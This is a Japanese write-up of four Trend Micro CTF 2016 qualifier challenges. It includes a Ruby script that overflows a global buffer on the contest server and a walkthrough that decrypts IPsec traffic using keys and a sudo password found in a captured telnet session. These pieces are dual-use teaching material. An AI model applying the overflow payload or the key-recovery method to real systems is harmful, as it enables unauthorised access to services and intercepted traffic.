---
date: "2016-08-17T00:17:26+09:00"
title: "Trend Micro CTF 2016 Online qualifier"
tags:
  - CTF
  - Write-ups
  - TMCTF
slug: tmctf2016-qual
---

日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われた[Trend Micro CTF 2016](http://www.trendmicro.co.jp/jp/sp/ctf2016_jp/)のwrite-upです。

urandomは4問解答し600点、92位でした。

Analysis-Offensive 100をyyu、Analysis-Offensive 200、Misc 100、Misc 200をmaythが解答しました。


# Analysis - Offensive 100

> Category: Analysis/Offensive
>
> Points: 100
>
> Please enter key. Key is TMCTF flag.
> 
> Download the file
> Decrypt the downloaded file by the following command.
> 
> `openssl enc -d -aes-256-cbc -k x0nSTZ9NrDgvCnqKhL9y -in files1.enc -out files1.zip`
> 
> `unzip files1.zip`

この問題は巨大なJavaScriptから正解の鍵を得るというものです。
まず、巨大なJavaScriptのうちの多くの部分は定数をGoogleで調べるなどすると、MD5を実装しているということが分かります。そして、次の3つの文字列もMD5のハッシュ値であろうという推測ができます。

```javascript
var ko = "c33367701511b4f6020ec61ded352059";

var ka = "61636f697b57b5b7d389db0edb801fc3";

var kq = "d2172edf24129e06f3913376a12919a4";
```

これらをまたGoogleで調べると、それぞれ次のような文字列であることが分かります。

- `c33367701511b4f6020ec61ded352059` → `654321`
- `61636f697b57b5b7d389db0edb801fc3` → `qwerty`
- `d2172edf24129e06f3913376a12919a4` → `admin`

そして次の処理でこれらの文字列を変数`nl`に従って並び換えているということが分かります。

```javascript
var c = "", d = "", e = "";
for (var f = 0; f < b.length; ) {
    c += b[nl[++f]];
    d += b[nl[++f]];
    e += b[nl[++f]];
}

// ......中略......

var nl = [ 0, 2, 1, 12, 7, 15, 5, 4, 8, 16, 17, 3, 9, 10, 14, 11, 13, 6, 0 ];
```

最終的にフラグは`TMCTF{q6r4dy5ei2na1twm3}`でした。


# Analysis - Offensive 200

> Category: Analysis - offensive
>
> Points: 200
>
> This challenge is composed of a simple remote overflow of a global array. The server address is 52.197.128.90 and the vulnerable application listens on TCP port 80-85. Each port has the same behavior so you can select one of them.
>
> The following code contains a bug that can be exploited to read back a flag:
>
```c
int pwned;
char buffer[1024];

DWORD WINAPI CallBack(LPVOID lpParameter) {
	pwned = 0;
	ZeroMemory(buffer, 1024);
	SOCKET *sock = (SOCKET *)lpParameter;
	SOCKET _sock = *sock;
	send(_sock, "Welcome", 8, 0);
	int ret = 0;
	ret = recv(_sock, buffer, 1028, 0);
	printf("[x] RET: %d.\n", ret);
	printf("[x] PWNED: 0x%x.\n", pwned);
	Sleep(1);
	if (((pwned >> 16)&0xFFFF ^ 0xc0fe) == 0x7eaf && (((pwned & 0xFFFF)^0x1a1a) == 0xdae4)) {

			send(_sock, "PWNED", 5, 0);
			ReadAndReturn(L"key.txt", _sock);
			closesocket(_sock);
			return 0;
	}
	else {
		send(_sock, "GO AWAY", 7, 0);
		closesocket(_sock);
	}

	return 0;
 }
```
>
>
> Craft a packet that would return a valid flag. Good luck!

`buffer`が1024バイトしか確保されていないにもかかわらず、11行目で `ret = recv(_sock, buffer, 1028, 0);` と1028バイト読み込むようになっている。したがって、1025-1028バイトの範囲に特定のバイト列を仕込めばよい。満たすべき条件は15行目のif文。

なぜか `nc` が1024バイトで送信を打ち切ってしまったので、Rubyで書いた。

```ruby
require 'socket'

HOST = '52.197.128.90'
port = (80..85).to_a.sample

puts "connecting #{HOST}:#{port}"
sock = TCPSocket.open('52.197.128.90', port)

payload = 'a' * 1024 + "\xfe\xc0\x51\xbe"

sock.read(8)
sock.send(payload, 0)
while r = sock.gets
  puts r
end
```

そして正解をメモし忘れた 😇


# Misc 100

> Category: Misc(iot and network)
>
> Points: 100
>
> Please analyze this pcap.

pcapファイルが渡される。中身を見ると、IPsecな通信と、普通にtelnetしている通信がある。

Wiresharkでtelnetでのやりとりをテキストとして見ると、 `ip xfrm state`を叩いている箇所がある。

```
.]0;reds@localhost:~.[reds@localhost ~]$ sudo ip xfrm state
.sudo ip xfrm state
[sudo] password for reds: ynwa
.
src 1.1.1.11 dst 1.1.1.10
	proto esp spi 0xfab21777 reqid 16389 mode tunnel
	replay-window 32 flag 20
	auth hmac(sha1) 0x11cf27c5b3357a5fd5d26d253fffd5339a99b4d1
	enc cbc(aes) 0xfa19ff5565b1666d3dd16fcfda62820da44b2b51672a85fed155521bedb243ee
src 1.1.1.10 dst 1.1.1.11
	proto esp spi 0xbfd6dc1c reqid 16389 mode tunnel
	replay-window 32 flag 20
	auth hmac(sha1) 0x829b457814bd8856e51cce1d745619507ca1b257
	enc cbc(aes) 0x2a340c090abec9186c841017714a233fba6144b3cb20c898db4a30f02b0a003d
src 1.1.1.10 dst 1.1.1.11
	proto esp spi 0xeea1503c reqid 16389 mode tunnel
	replay-window 32 flag 20
	auth hmac(sha1) 0x951d2d93498d2e7479c28c1bcc203ace34d7fcde
	enc cbc(aes) 0x6ec6072dd25a6bcb7b9b3b516529acb641a1b356999f791eb971e57cc934a5eb
src 1.1.1.11 dst 1.1.1.10
	proto esp spi 0xd4d2074d reqid 16389 mode tunnel
	replay-window 32 flag 20
	auth hmac(sha1) 0x100a0b23fc006c867455506843cc96ad26026ec0
	enc cbc(aes) 0xdcfbc7d33d3c606de488c6efac4624ed50b550c88be0d62befb049992972cca6
```

この情報を元に、IPsecの通信の中身を見ることができる。すると、HTTPでいくつかやりとりをしている箇所が見つかる。その中に `flag.png` というファイルのダウンロードが含まれている。これを抽出して開くと、フラグが書かれている。


# Misc 200

> Category: Misc(iot and network)
>
> Points: 200
>
> find all LTE bands this phone supported.
>
> the final answer will be from small to big, and use ',' to seperate without spaces.
>
> example> if the answer is band 1 and 2 and 3, the key should be: "TMCTF{1,2,3}"

`ModemSettings.txt` というファイルが与えられ、そこからその携帯電話の対応しているLTEバンドを答える。

この `ModemSettings.txt` はどうやら NV-items_reader_writerというソフトウェアによる出力らしい。

LTEのバンドに関する設定は"6828"番にあるという。該当する箇所を引用する。

```
6828 (0x1AAC)   -   OK
FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

ここに書き込まれている数値が対応LTEバンドを表している。ビット単位で読んで、あるビットが立っていたら、そのビットと対応するバンドをサポートしていることを意味している。最右ビットがバンド1に対応する。

寝起きでつらいワンライナーを書いておしまい。エンディアンに注意。

```ruby
i=0; puts (0x031F1DFF).to_s(2).reverse.split(//).map { |c| i +=1; [c, i] }.select { |x| x[0] == '1' }.map { |x| x[1] }.join(',')
```